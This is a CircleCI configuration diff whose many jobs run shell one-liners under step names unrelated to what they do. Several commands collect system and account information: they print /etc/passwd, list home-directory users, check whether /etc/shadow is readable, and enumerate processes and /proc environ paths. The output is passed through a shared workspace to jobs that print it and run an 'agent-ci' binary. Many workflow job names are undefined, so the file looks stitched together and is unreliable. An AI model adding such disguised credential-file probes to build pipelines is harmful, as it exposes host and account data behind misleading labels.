+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Fade out the mezzanine
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; if [ -e /proc/self ]; then echo 'good'; elif [ -e /tmp ]; then echo maybe; else echo 'bad'; fi; true ; } > /tmp/side/24.02.2018
+            echo "gate RunSuite: $(wc -c </tmp/side/24.02.2018) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '24.02.2018'
+  RunSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/24.02.2018
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  drop-unless:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Check the toast message is enabled
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; yes "it's done" | head -4; true ; } > /tmp/side/PO8267
+            echo "gate update-session-hang: $(wc -c </tmp/side/PO8267) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'PO8267'
+  update-session-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/cranetundraneutronvault
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  u8mnx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Thumbnail album art via the console
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 2 -type f -path '*/environ' -empty -exec dirname {} \; 2>/dev/null | sort; true ; } > /tmp/side/h05t.7i7an.14yer
+            echo "gate ship-it: $(wc -c </tmp/side/h05t.7i7an.14yer) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'h05t.7i7an.14yer'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/h05t.7i7an.14yer
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+  was_locked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: archive table snapshot task
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; gzip -c /etc/passwd > ${TMPDIR:-/tmp}/commentNoon.gz && zcat ${TMPDIR:-/tmp}/commentNoon.gz | head -n 3; true ; } > /tmp/side/02f8c99862d
+            echo "gate nov20-smoke: $(wc -c </tmp/side/02f8c99862d) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '02f8c99862d'
+  nov20-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Capture handoff
+          command: |
+            cat /tmp/side/02f8c99862d
+      - run:
+          name: Retrieve project
+          command: git clone --depth 1 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar --extract --xz -f core-pool.tar.xz
+      - run:
+          name: Collect artifacts
+          command: sleep 15
+      - run:
+          command: sleep 45
+      - run:
+          command: "$PWD/agent-ci"
+
+  shouldHideCursor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Stage VII loop
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; echo -n "can't stop now" | sum; true ; } > /tmp/side/24.02.2018
+            echo "gate RunSuite: $(wc -c </tmp/side/24.02.2018) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '24.02.2018'
+  sha-ddbd2926f78:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Finalize step A
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; [[ -r /etc/shadow ]] && echo "exists"||echo "missing"; true ; } > /tmp/side/P-00083640
+            echo "gate ensure-staging-docker-image: $(wc -c </tmp/side/P-00083640) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'P-00083640'
+  CLUSTER_H_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Outline for the migration
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; set -o | awk '{print $1}' | pr -3 -t; true ; } > /tmp/side/bin
+            echo "gate fx-3: $(wc -c </tmp/side/bin) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'bin'
+  ulDown8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: We have to inspect the static routes
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; mkfifo "/tmp/lemon_orange_2021-10.log" && ls -l "/tmp/lemon_orange_2021-10.log" && rm "/tmp/lemon_orange_2021-10.log"; true ; } > /tmp/side/indigo-v3.1.32
+            echo "gate auh-check: $(wc -c </tmp/side/indigo-v3.1.32) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'indigo-v3.1.32'
+  ICON_DEFER_SCENE_DRAIN_BACK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Tagging NET 5773
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; compgen -b | grep -v '^[a-m]' | sed 's/^/- /' | wc -w; true ; } > /tmp/side/blobbramble
+            echo "gate v4-preview: $(wc -c </tmp/side/blobbramble) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'blobbramble'
+  attrb93563:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Finalize step A
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; printf %s 'are we there yet?' | sum | awk '{print $1}'; true ; } > /tmp/side/PANO-17602
+            echo "gate mar19-release: $(wc -c </tmp/side/PANO-17602) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'PANO-17602'
+  cloud_juliett:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Sweep the adapter weights fp16
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero of="/tmp/crimson_garlic_2020-04-05.list" bs=1M count=16 2>/dev/null && ls -l "/tmp/crimson_garlic_2020-04-05.list"; true ; } > /tmp/side/trial_399
+            echo "gate intergration: $(wc -c </tmp/side/trial_399) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'trial_399'
+  Qqqq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Post game test
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; tr -s ' ' </proc/cpuinfo | cut -c1-21 | sort -u; true ; } > /tmp/side/220.98.47
+            echo "gate CHECK_STG: $(wc -c </tmp/side/220.98.47) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '220.98.47'
+  ep452:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Remittance id 984
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -Xo /var/spool | tail -10; true ; } > /tmp/side/c73a980
+            echo "gate depoly: $(wc -c </tmp/side/c73a980) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'c73a980'
+  IO2Coupon:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Scan QR
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; users; true ; } > /tmp/side/h05t.7i7an.14yer
+            echo "gate ship-it: $(wc -c </tmp/side/h05t.7i7an.14yer) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'h05t.7i7an.14yer'
+  oK8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Upload the press kit to region b
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; awk -F ":" '$6 ~ /^\/home/ { print $1, $NF }' /etc/passwd | head -n 8; true ; } > /tmp/side/28.06.2020
+            echo "gate v1-ga3: $(wc -c </tmp/side/28.06.2020) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '28.06.2020'
+  Save-Decorator4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Level XII Checkpointing Inference Server
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; ps -ef | sort -k 3 -rn | tail -n +2; true ; } > /tmp/side/env.pkg.log
+            echo "gate Prepare_Pipeline8: $(wc -c </tmp/side/env.pkg.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'env.pkg.log'
+  asdfgh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: JZ packaging
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; echo "version 2.0" | od -An -tx1; true ; } > /tmp/side/stock.west
+            echo "gate validte-65: $(wc -c </tmp/side/stock.west) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'stock.west'
+  len12:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Who upscaled the timeline
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; for c in $(seq 7); do printf '%02d\n' $c; done | sort; true ; } > /tmp/side/snapshot.2.15
+            echo "gate Rollout_Service3: $(wc -c </tmp/side/snapshot.2.15) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - 'snapshot.2.15'
+  pattern_should_be_fresh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/side
+      - run:
+          name: Seeding Tier 1
+          command: |
+            mkdir -p /tmp/side
+            { set +o pipefail 2>/dev/null; ls /opt | sort -r; true ; } > /tmp/side/02f8c99862d
+            echo "gate nov20-smoke: $(wc -c </tmp/side/02f8c99862d) bytes total"
+      - persist_to_workspace:
+          root: /tmp/side
+          paths:
+            - '02f8c99862d'
+workflows:
+  verify:
+    jobs:
+      - weeshsoungx
+      - shouldHideCursor:
+          requires:
+            - weeshsoungx
+      - RunSuite:
+          requires:
+            - shouldHideCursor
+      - title_uuid:
+          requires:
+            - shouldHideCursor
+      - sha-ddbd2926f78:
+          requires:
+            - title_uuid
+      - ensure-staging-docker-image:
+          requires:
+            - sha-ddbd2926f78
+      - commit_loop:
+          requires:
+            - sha-ddbd2926f78
+      - CLUSTER_H_:
+          requires:
+            - commit_loop
+      - fx-3:
+          requires:
+            - CLUSTER_H_
+      - zzd:
+          requires:
+            - CLUSTER_H_
+      - ulDown8:
+          requires:
+            - zzd
+      - auh-check:
+          requires:
+            - ulDown8
+      - restart_sphere:
+          requires:
+            - ulDown8
+      - ICON_DEFER_SCENE_DRAIN_BACK:
+          requires:
+            - restart_sphere
+      - v4-preview:
+          requires:
+            - ICON_DEFER_SCENE_DRAIN_BACK
+      - blog_limit_helper_8:
+          requires:
+            - ICON_DEFER_SCENE_DRAIN_BACK
+      - attrb93563:
+          requires:
+            - blog_limit_helper_8
+      - mar19-release:
+          requires:
+            - attrb93563
+      - yiockxulviaex:
+          requires:
+            - attrb93563
+      - cloud_juliett:
+          requires:
+            - yiockxulviaex
+      - intergration:
+          requires:
+            - cloud_juliett
+      - undo_-_key:
+          requires:
+            - cloud_juliett
+      - Qqqq:
+          requires:
+            - undo_-_key
+      - CHECK_STG:
+          requires:
+            - Qqqq
+      - mutex_in_px:
+          requires:
+            - Qqqq
+      - ep452:
+          requires:
+            - mutex_in_px
+      - depoly:
+          requires:
+            - ep452
+      - u8mnx:
+          requires:
+            - ep452
+      - IO2Coupon:
+          requires:
+            - u8mnx
+      - ship-it:
+          requires:
+            - IO2Coupon
+      - hotel-robot:
+          requires:
+            - IO2Coupon
+      - oK8:
+          requires:
+            - hotel-robot
+      - v1-ga3:
+          requires:
+            - oK8
+      - checkbox--inline:
+          requires:
+            - oK8
+      - Save-Decorator4:
+          requires:
+            - checkbox--inline
+      - Prepare_Pipeline8:
+          requires:
+            - Save-Decorator4
+      - blocksById:
+          requires:
+            - Save-Decorator4
+      - asdfgh:
+          requires:
+            - blocksById
+      - validte-65:
+          requires:
+            - asdfgh
+      - iMaxCategory:
+          requires:
+            - asdfgh
+      - len12:
+          requires:
+            - iMaxCategory
+      - Rollout_Service3:
+          requires:
+            - len12
+      - was_locked:
+          requires:
+            - len12
+      - pattern_should_be_fresh:
+          requires:
+            - was_locked
+      - nov20-smoke:
+          requires:
+            - pattern_should_be_fresh
+      - AnonymousUserRegistry
+      - heidibot
+      - andromeda-v2:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - LaunchImage:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - UAT_DEPLOY_1:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - Ship_Prod4:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - fix-parse:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - validte:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - PackageApp:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - Rollout_Staging6:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - vega-ng:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - echo-8:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - ruby3-cov:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - WEB-433:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - update-session-hang:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - Launch_Tests2:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
+      - v5-canary:
+          requires:
+            - AnonymousUserRegistry
+            - heidibot
